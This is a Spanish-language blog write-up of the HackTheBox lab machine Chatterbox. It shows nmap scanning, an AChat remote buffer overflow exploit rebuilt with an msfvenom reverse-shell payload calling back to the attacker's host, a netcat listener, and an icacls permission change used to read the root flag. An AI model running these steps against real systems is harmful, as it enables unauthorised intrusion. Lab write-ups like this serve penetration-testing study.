---
layout: post
title: HTB_Chatterbox
date: 2023/07/10
slug: HTB_Chatterbox
heroImage: /assets/machines.jpg
---

# Chatterbox {-}

## Introduccion {-}

La maquina del dia se llama Chatterbox.

El replay del live se puede ver aqui

[![S4vitaar Chatterbox maquina](https://img.youtube.com/vi/WeaLhmbatT0/0.jpg)](https://www.youtube.com/watch?v=WeaLhmbatT0)

Esta maquina hace parte de una sesion intensa y se puede ver a partir de 4:50:15.

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.74
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.74
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.74 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p9255,9256 10.10.10.74 -oN targeted
```


| Puerto | Servicio          | Que se nos occure? | Que falta? |
| ------ | ----------------- | ------------------ | ---------- |
| 9255   | http AChat        | Web, Fuzzing       |            |
| 9256   | achat chat system |                    |            |


## Vulnerability Assessment {-}


### Achat Chat system {-}

```bash
searchsploit achat
```

Todavia no savemos lo que es achat pero vemos exploit de typo Remote Buffer Overflow

```bash
searchsploit -m 36025
mv 36025.py achat_exploit.py
cat achat_exploit.py
```

Mirando el codigo, vemos que es un bufferflow normal que lanza una calculadora. Lo modificamos para
lanzar una reverse shell.
## Vuln exploit & Gaining Access {-}

### Ganando accesso con Remote BOF {-}


1. Nos creamos un nuevo shellcode basada a la informacion del exploit

    ```bash
    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\
    x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\
    xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\
    xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\
    xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
    ```

1. Copiamos el shell code generado y lo ponemos al sitio del buff shellcode del exploit
1. Cambiamos la ip de la maquina victima
1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el exploit modificado con python 2

    ```bash
    python achat_exploit.py
    ```

```bash
whoami
#Output
chatterbox\alfred
```

Podemos leer la flag## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami /priv
cd Desktop
type root.txt
```

No podemos leer la flag de root pero es curioso que nos podamos meter en su directorio user.

```bash
icacls root.txt
cd ..
icacls Desktop
```

Vemos que el usuario alfred tiene privilegios Full sobre el directorio Desktop del usuario root.

```bash
cd Desktop
icacls root.txt /grant alfred:F
type root.txt
```

Podemos leer la flag, lol :)
